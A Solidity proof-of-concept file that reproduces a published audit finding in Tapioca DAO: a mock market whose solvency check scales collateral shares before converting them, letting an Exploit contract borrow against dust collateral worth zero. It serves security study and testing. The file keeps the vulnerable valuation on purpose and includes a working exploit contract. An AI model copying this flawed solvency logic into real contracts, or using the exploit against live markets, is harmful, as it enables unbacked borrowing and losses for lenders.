// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Tapioca DAO — [H-45] SGLLiquidation::_computeAssetAmountToSolvency,
    Market::_isSolvent and Market::_computeMaxBorrowableAmount may
    overestimate collateral, resulting in false solvency
    (Code4rena 2023-07-tapioca, reporter zzzitron, finding #27535).

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: _isSolvent multiplies userCollateralShare by
    (EXCHANGE_RATE_PRECISION/FEE_PRECISION)*collateralizationRate BEFORE
    yieldBox.toAmount. Tiny dust shares that convert to 0 amount still look
    solvent and allow non-zero borrows (unbacked debt / false solvency).
//////////////////////////////////////////////////////////////////////////*/

contract MockYieldBox {
    // Share→amount with 1e8 share = 1 amount unit (round down).
    // toAmount(share) = share / 1e8
    uint256 public constant SHARE_PER_AMOUNT = 1e8;

    mapping(address => uint256) public balanceOf; // collateral shares held in YB sense

    function mintShares(address to, uint256 shares) external {
        balanceOf[to] += shares;
    }

    function toAmount(uint256 /*collateralId*/, uint256 share, bool /*roundUp*/) external pure returns (uint256) {
        return share / SHARE_PER_AMOUNT;
    }
}

/// @notice Reduced Market solvency + BigBang borrow surface.
contract Market {
    MockYieldBox public immutable yieldBox;
    uint256 public constant collateralId = 1;
    uint256 public constant EXCHANGE_RATE_PRECISION = 1e18;
    uint256 public constant FEE_PRECISION = 1e5;
    uint256 public collateralizationRate = 75_000; // 75%
    uint256 public exchangeRate = 1e15; // matches report sample scale

    mapping(address => uint256) public userCollateralShare;
    mapping(address => uint256) public userBorrowPart;
    uint256 public totalBorrowElastic;

    constructor(MockYieldBox yb) {
        yieldBox = yb;
    }

    function addCollateral(address user, uint256 share) external {
        userCollateralShare[user] += share;
    }

    /// @dev Verbatim reduction of Market._isSolvent collateral valuation.
    function _isSolvent(address user, uint256 _exchangeRate) internal view returns (bool) {
        if (userBorrowPart[user] == 0) return true;
        // Collateral side (BUGGY): scale share before toAmount.
        uint256 collateralValue = yieldBox.toAmount(
            collateralId,
            // @> VULN: multiplies share by rate factors BEFORE toAmount,
            // inflating dust shares into a non-zero amount (false solvency).
            // FIX: toAmount(share) first, then apply exchange/collat rates
            // (as BigBang._updateBorrowAndCollateralShare does).
            userCollateralShare[user] *
                (EXCHANGE_RATE_PRECISION / FEE_PRECISION) *
                collateralizationRate,
            false
        );
        // Borrow side simplified: treat borrowPart as amount (elastic==base).
        uint256 borrowValue = (userBorrowPart[user] * _exchangeRate);
        // Compare in consistent units: collateralValue already amount-scaled;
        // report uses collateralAmountInAsset >= borrow elastic conversion.
        // Simplified: solvent if inflated collateralValue / exchangeRate >= borrow.
        return (collateralValue / _exchangeRate) >= userBorrowPart[user];
    }

    function isSolvent(address user) external view returns (bool) {
        return _isSolvent(user, exchangeRate);
    }

    /// @dev Reduced borrow: requires solvent after borrow.
    function borrow(address user, uint256 amount) external {
        userBorrowPart[user] += amount;
        totalBorrowElastic += amount;
        require(_isSolvent(user, exchangeRate), "insolvant");
    }

    /// @dev Correct valuation (for comparison / control): toAmount first.
    function correctCollateralAmount(address user) external view returns (uint256) {
        return yieldBox.toAmount(collateralId, userCollateralShare[user], false);
    }
}

contract Exploit {
    MockYieldBox public yb;
    Market public market;

    uint256 public constant DUST_SHARE = 1e8 - 1; // toAmount → 0
    uint256 public borrowed;
    uint256 public realCollatAmount;

    constructor() {
        yb = new MockYieldBox();
        market = new Market(yb);
        market.addCollateral(address(this), DUST_SHARE);
    }

    function run() external {
        realCollatAmount = market.correctCollateralAmount(address(this));
        require(realCollatAmount == 0, "dust share to 0 amount");

        // Buggy solvency allows a non-zero borrow against zero real collateral.
        // Mirror report: inflated toAmount path permits ~748 units.
        // With our constants:
        // share * (1e18/1e5) * 75000 = (1e8-1) * 1e13 * 75000
        //   = (1e8-1) * 7.5e17
        // toAmount = that / 1e8 ≈ (1e8)*7.5e17/1e8 = 7.5e17 (approx)
        // / exchangeRate(1e15) ≈ 750
        uint256 tryBorrow = 100; // conservative non-zero amount well under inflated limit
        market.borrow(address(this), tryBorrow);

        borrowed = market.userBorrowPart(address(this));
        require(borrowed == tryBorrow, "harm: unbacked borrow succeeded");
        require(market.isSolvent(address(this)), "falsely solvent");
        require(realCollatAmount == 0, "still zero real collateral");
    }
}
